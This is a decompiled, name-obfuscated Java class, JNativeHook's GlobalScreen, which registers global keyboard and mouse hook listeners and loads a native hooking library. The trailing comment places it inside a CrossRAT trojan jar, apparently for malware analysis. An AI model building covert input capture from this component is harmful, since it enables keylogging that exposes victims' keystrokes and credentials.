package org.jnativehook;

import java.io.File;
import java.util.Iterator;
import java.util.concurrent.ExecutorService;
import java.util.logging.Logger;
import javax.swing.event.EventListenerList;
import org.jnativehook.b.b;

public final class GlobalScreen
{
  private static Logger a = Logger.getLogger(GlobalScreen.class.getPackage().getName());
  private static GlobalScreen.NativeHookThread b;
  private static ExecutorService c = new a();
  private static EventListenerList d = new EventListenerList();
  
  public static void a(org.jnativehook.a.a parama)
  {
    if (parama != null) {
      d.add(org.jnativehook.a.a.class, parama);
    }
  }
  
  public static void b(org.jnativehook.a.a parama)
  {
    if (parama != null) {
      d.remove(org.jnativehook.a.a.class, parama);
    }
  }
  
  public static void a(b paramb)
  {
    if (paramb != null) {
      d.add(b.class, paramb);
    }
  }
  
  public static void b(b paramb)
  {
    if (paramb != null) {
      d.remove(b.class, paramb);
    }
  }
  
  public static void a(org.jnativehook.b.c paramc)
  {
    if (paramc != null) {
      d.add(org.jnativehook.b.c.class, paramc);
    }
  }
  
  public static void b(org.jnativehook.b.c paramc)
  {
    if (paramc != null) {
      d.remove(org.jnativehook.b.c.class, paramc);
    }
  }
  
  public static void a(org.jnativehook.b.d paramd)
  {
    if (paramd != null) {
      d.add(org.jnativehook.b.d.class, paramd);
    }
  }
  
  public static void b(org.jnativehook.b.d paramd)
  {
    if (paramd != null) {
      d.remove(org.jnativehook.b.d.class, paramd);
    }
  }
  
  public static void a()
  {
    if ((b == null) || (!b.isAlive())) {
      synchronized (b = new GlobalScreen.NativeHookThread())
      {
        b.start();
        try
        {
          b.wait();
        }
        catch (InterruptedException localInterruptedException)
        {
          throw new c(localInterruptedException);
        }
        c localc;
        if ((localc = b.a()) != null) {
          throw localc;
        }
        return;
      }
    }
  }
  
  public static void b()
  {
    if (c()) {
      synchronized (b)
      {
        b.disable();
        try
        {
          b.join();
        }
        catch (InterruptedException localInterruptedException)
        {
          throw new c(localInterruptedException.getCause());
        }
        return;
      }
    }
  }
  
  public static boolean c()
  {
    return (b != null) && (b.isAlive());
  }
  
  public static void a(ExecutorService paramExecutorService)
  {
    if (c != null) {
      c.shutdown();
    }
    c = paramExecutorService;
  }
  
  static
  {
    Object localObject = System.getProperty("jnativehook.lib.name", "JNativeHook");
    try
    {
      System.loadLibrary((String)localObject);
      return;
    }
    catch (UnsatisfiedLinkError localUnsatisfiedLinkError)
    {
      localObject = System.getProperty("jnativehook.lib.locator", "org.jnativehook.DefaultLibraryLocator");
      try
      {
        localObject = (localObject = (d)Class.forName((String)localObject).asSubclass(d.class).newInstance()).a();
        while (((Iterator)localObject).hasNext())
        {
          File localFile;
          if (((localFile = (File)((Iterator)localObject).next()).exists()) && (localFile.isFile()) && (localFile.canRead())) {
            System.load(localFile.getPath());
          }
        }
        return;
      }
      catch (Exception localException)
      {
        a.severe(localException.getMessage());
        throw new UnsatisfiedLinkError(localException.getMessage());
      }
    }
  }
}


/* Location:              C:\Users\sihadan\Desktop\CrossRAT\CrossRAT\CrossRat\hmar6.jar!\org\jnativehook\GlobalScreen.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */